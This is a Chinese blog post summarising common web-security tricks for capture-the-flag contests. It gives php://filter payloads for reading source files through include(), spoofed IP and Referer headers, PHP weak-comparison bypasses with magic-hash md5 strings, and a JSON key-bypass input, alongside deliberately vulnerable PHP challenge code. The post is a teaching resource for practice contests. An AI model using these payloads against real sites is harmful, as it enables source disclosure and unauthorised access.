

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="Web In CTF常见套路 爆破，包括md5、爆破随机数、验证码识别等 绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截 花式玩弄几个PHP特性，包括弱类型，strpos和&#x3D;&#x3D;&#x3D;，反序列化 destruct、\0截断 各种找源码技巧，包括git、svn、xxx.php.swp、*www*.(zip|tar.gz|rar|7z)、xxx.php.bak 文件上传，包括花式文件后缀 .p">
<meta property="og:type" content="article">
<meta property="og:title" content="Web In CTF">
<meta property="og:url" content="http://example.com/2019/07/14/Web-In-CTF/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Web In CTF常见套路 爆破，包括md5、爆破随机数、验证码识别等 绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截 花式玩弄几个PHP特性，包括弱类型，strpos和&#x3D;&#x3D;&#x3D;，反序列化 destruct、\0截断 各种找源码技巧，包括git、svn、xxx.php.swp、*www*.(zip|tar.gz|rar|7z)、xxx.php.bak 文件上传，包括花式文件后缀 .p">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/12ScvV.png">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/12S2uT.png">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/12BSxg.png">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/12B9MQ.png">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/12BCrj.png">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/120Oat.png">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/120LVI.png">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/120I2D.png">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/120Hrd.png">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/1204PK.png">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/120vPf.png">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/120xG8.png">
<meta property="article:published_time" content="2019-07-14T07:40:14.000Z">
<meta property="article:modified_time" content="2020-02-08T07:45:20.000Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://s2.ax1x.com/2020/02/07/12ScvV.png">
  
  
  
  <title>Web In CTF - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Web In CTF"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2019-07-14 15:40" pubdate>
          2019年7月14日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          40k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          331 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Web In CTF</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="Web-In-CTF"><a href="#Web-In-CTF" class="headerlink" title="Web In CTF"></a>Web In CTF</h1><h2 id="常见套路"><a href="#常见套路" class="headerlink" title="常见套路"></a>常见套路</h2><ul>
<li>爆破，包括<code>md5</code>、爆破随机数、验证码识别等</li>
<li>绕<code>WAF</code>，包括花式绕<code>Mysql</code>、绕文件读取关键词检测之类拦截</li>
<li>花式玩弄几个PHP特性，包括弱类型，<code>strpos</code>和<code>===</code>，反序列化 <code>destruct</code>、<code>\0</code>截断</li>
<li>各种找源码技巧，包括<code>git</code>、<code>svn</code>、<code>xxx.php.swp</code>、<code>*www*.(zip|tar.gz|rar|7z)</code>、<code>xxx.php.bak</code></li>
<li>文件上传，包括花式文件后缀 <code>.php345</code> ，<code>.inc</code>， <code>.phtml</code>， <code>.phpt</code>， <code>.phps</code>、各种文件内容检测<code>&lt;?php</code>, <code>&lt;?</code>,  <code>&lt;%</code>,  <code>&lt;script language=php&gt;</code>、花式解析漏洞</li>
<li><code>Mysql</code>类型差异，包括和PHP弱类型类似的特性，<code>0x</code>、<code>0b</code>、<code>1e</code>之类，<code>varchar</code>和<code>integer</code>相互转换</li>
<li><code>open_basedir</code>、<code>disable_functions</code>花式绕过技巧，包括<code>dl</code>、<code>mail</code>、<code>imagick</code>、<code>bash</code>漏洞、<code>DirectoryIterator</code>及各种二进制选手插足的方法</li>
<li>社工，包括花式查社工库、微博、QQ签名、<code>whois</code></li>
<li><code>windows</code>特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、<code>::$DATA</code>，冒号截断</li>
<li>XSS，各种浏览器<code>auditor</code>绕过、富文本过滤黑白名单绕过、<code>flash xss</code></li>
<li>XXE，各种XML存在地方（<code>rss</code>&#x2F;<code>word</code>&#x2F;流媒体）、各种XXE利用方法（SSRF、文件读取）</li>
<li>HTTP协议，花式IP伪造<code> X-Forwarded-For</code>&#x2F;<code>X-Client-IP</code>&#x2F;<code>X-Real-IP</code>&#x2F;<code>CDN-Src-IP</code>、花式改UA，花式藏FLAG、花式分析数据包</li>
</ul>
<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h3><p>在线上CTF赛事的Web题目中，网页源代码是一个很重要的思路来源，按F12或右键查看源代码即可。</p>
<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>爬虫协议，有时可以通过它看见一些重要的目录。</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">User-agent: *<br>Disallow: <span class="hljs-regexp">/images/</span><br>Disallow: <span class="hljs-regexp">/f1ag.txt/</span><br>Disallow: /tips.php<br></code></pre></td></tr></table></figure>

<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>一般在右键源代码中，有时注释隐藏着重要的信息或者tips，或者出题者写下的思路。</p>
<h3 id="备份文件源码泄漏"><a href="#备份文件源码泄漏" class="headerlink" title="备份文件源码泄漏"></a>备份文件源码泄漏</h3><p>​	常见备份文件后缀：</p>
<ul>
<li><p><code>.rar</code></p>
</li>
<li><p><code>.zip</code></p>
</li>
<li><p><code>.7z</code></p>
</li>
<li><p><code>.tar.gz</code></p>
</li>
<li><p><code>.bak</code></p>
</li>
<li><p><code>.swp</code></p>
</li>
<li><p><code>.txt</code></p>
</li>
<li><p><code>.html</code></p>
</li>
<li><p><code>linux</code>中可能以” <code>~</code> “ 结尾</p>
</li>
<li><p><code>ng</code>源码泄露，<code>git</code>源码泄露，<code>DS_Store</code>文件泄漏，网站备份压缩文件，SVN导致文件泄露，WEB-INF&#x2F;web.xml泄露，CVS泄漏等，可参考以下资料：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/7628153.html">CTF中常见Web源码泄露总结</a></p>
<p><a target="_blank" rel="noopener" href="http://www.s2.sshz.org/post/source-code-leak/">常见Web源码泄露解析</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/21296806">文件泄露</a></p>
</li>
</ul>
<h3 id="include漏洞"><a href="#include漏洞" class="headerlink" title="include漏洞"></a>include漏洞</h3><p>遇到<code>php</code>代码中有<code>include($file)</code>的，一般和 <code>php://input</code>或者<code>php://filter</code>有关，​<code>$file</code>值如果是<code>php://input</code>，就要用post表单构造数据，如果是<code>php://filter</code>，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encoding/resource=文件名(如index.php)</span><br>php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=index.php</span><br></code></pre></td></tr></table></figure>

<h2 id="抓包-x2F-HTTP"><a href="#抓包-x2F-HTTP" class="headerlink" title="抓包&#x2F;HTTP"></a>抓包&#x2F;HTTP</h2><h3 id="GET-amp-POST"><a href="#GET-amp-POST" class="headerlink" title="GET&amp;POST"></a>GET&amp;POST</h3><p>Get和Post操作是传参的基本操作，也是CTF中很常见的常规操作。</p>
<p>GET：在<code>url</code>中提交参数，如<code>/index.php?a=1</code></p>
<p>POST：可通过<code>hackbar</code>或抓包插入post数据提交</p>
<p>最直接的区别：</p>
<p>GET请求的参数是放在URL里的，POST请求参数是放在请求body里的。</p>
<h3 id="HTTP头部绕过姿势"><a href="#HTTP头部绕过姿势" class="headerlink" title="HTTP头部绕过姿势"></a>HTTP头部绕过姿势</h3><ul>
<li><p>如果提示需要本地ip或指定ip才能访问，则可在报文头部添加以下几种常用信息段：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">X-Client-IP</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Client-IP</span><span class="hljs-punctuation">: </span>127.0.0.1<br>(ip地址可以根据需要修改)<br></code></pre></td></tr></table></figure>
</li>
<li><p>如果需要验证网页来源，如一定要从谷歌跳转过来的页面才允许访问，则可在报文头部添加：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://www.google.com<br></code></pre></td></tr></table></figure>
</li>
<li><p>如果网页需要验证cookie，我们可以在http头部加入：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>u = stupid;<br></code></pre></td></tr></table></figure>
</li>
<li><p>除了以上几种常见的情况，还需根据具体情况来使用不同的操作</p>
</li>
</ul>
<h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><h3 id="php弱类型"><a href="#php弱类型" class="headerlink" title="php弱类型"></a>php弱类型</h3><h4 id="x3D-x3D-与-x3D-x3D-x3D"><a href="#x3D-x3D-与-x3D-x3D-x3D" class="headerlink" title="&#x3D;&#x3D; 与 &#x3D;&#x3D;&#x3D;"></a>&#x3D;&#x3D; 与 &#x3D;&#x3D;&#x3D;</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span> ;<br>	<span class="hljs-variable">$a</span> === <span class="hljs-variable">$b</span> ;<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</span><br><span class="hljs-comment">// == 在进行比较的时候，会先将字符串类型转化成相同，再比较</span><br></code></pre></td></tr></table></figure>

<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin&quot;</span> == <span class="hljs-number">0</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;1admin&quot;</span>== <span class="hljs-number">1</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>== <span class="hljs-number">1</span>); <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>== <span class="hljs-number">0</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); <span class="hljs-comment">//true </span><br><span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//上述代码可自行测试</span><br>    <br> <span class="hljs-comment">// 观察上述代码</span><br> <span class="hljs-comment">//&quot;admin&quot;==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等</span><br> <span class="hljs-comment">//&quot;1admin&quot;==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，即是&quot;admin1&quot;被转化成了0,为什么呢？？</span><br> <span class="hljs-comment">//&quot;0e123456&quot;==&quot;0e456789&quot;相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</span><br></code></pre></td></tr></table></figure>

<p><code>php</code>手册：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">当一个字符串当作一个数值来取值，其结果和类型如下:如果该字符串没有包含&#x27;.&#x27;,&#x27;e&#x27;,&#x27;E&#x27;并且其数值值在整形的范围之内</span><br><span class="hljs-comment">该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span> + <span class="hljs-string">&quot;10.5&quot;</span>; <span class="hljs-comment">// $test=11.5(float)</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;-1.3e3&quot;</span>; <span class="hljs-comment">//$test=-1299(float)</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;bob-1.3e3&quot;</span>;<span class="hljs-comment">//$test=1(int)</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;2admin&quot;</span>;<span class="hljs-comment">//$test=3(int)</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;admin2&quot;</span>;<span class="hljs-comment">//$test=1(int)</span><br><span class="hljs-meta">?&gt;</span><br>    <br>So that<span class="hljs-string">&#x27;s why &quot; &quot;admin1&quot;==1 =&gt;False &quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/07/12ScvV.png" srcset="/img/loading.gif" lazyload alt="12ScvV.png"></p>
<h4 id="md5绕过-Hash比较缺陷"><a href="#md5绕过-Hash比较缺陷" class="headerlink" title="md5绕过(Hash比较缺陷)"></a>md5绕过(Hash比较缺陷)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$logined</span> = <span class="hljs-literal">true</span>;<br>    <span class="hljs-variable">$Username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$Username</span>)) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>) ) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$Username</span>) != <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$logined</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;successful&quot;</span>;<br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;login failed!&quot;</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句 </p>
<p>介绍一批md5开头是0e的字符串</p>
<p><strong>0e在比较的时候会将其视作为科学计数法</strong>，所以无论0e后面是什么，0的多少次方还是0。</p>
<p>键入**md5(‘240610708’) &#x3D;&#x3D; md5(‘QNKCDZO’)**成功绕过！</p>
<p>收集md5开头是0e的字符串（来源于网络）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php">QNKCDZO<br><span class="hljs-number">0e830400451993494058024219903391</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br>  <br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br>  <br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br>  <br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br>  <br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br>  <br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br>  <br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br></code></pre></td></tr></table></figure>

<h4 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>]);<br>    <span class="hljs-variable">$key</span> =<span class="hljs-string">&quot;*********&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$message</span>-&gt;key == <span class="hljs-variable">$key</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>    &#125;<br> &#125;<br> <span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;~~~~&quot;</span>;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>输入一个json类型的字符串，json_decode函数解成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，<strong>但是可以利用0&#x3D;&#x3D;”admin”这种形式绕过</strong>.</p>
<p>**最终payload **</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">message=<span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<h4 id="array-search-is-array绕过"><a href="#array-search-is-array绕过" class="headerlink" title="array_search is_array绕过"></a>array_search is_array绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]))&#123;<span class="hljs-keyword">exit</span>();&#125;<br><span class="hljs-variable">$test</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$test</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$test</span>[<span class="hljs-variable">$i</span>]===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-variable">$test</span>[<span class="hljs-variable">$i</span>]=<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$test</span>[<span class="hljs-variable">$i</span>]);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-variable">$test</span>)===<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>先判断传入的是不是数组，然后循环遍历数组中的每个值，并且数组中的每个值不能和admin相等，并且将每个值转化为int类型，再判断传入的数组是否有admin，有则返回flag。</p>
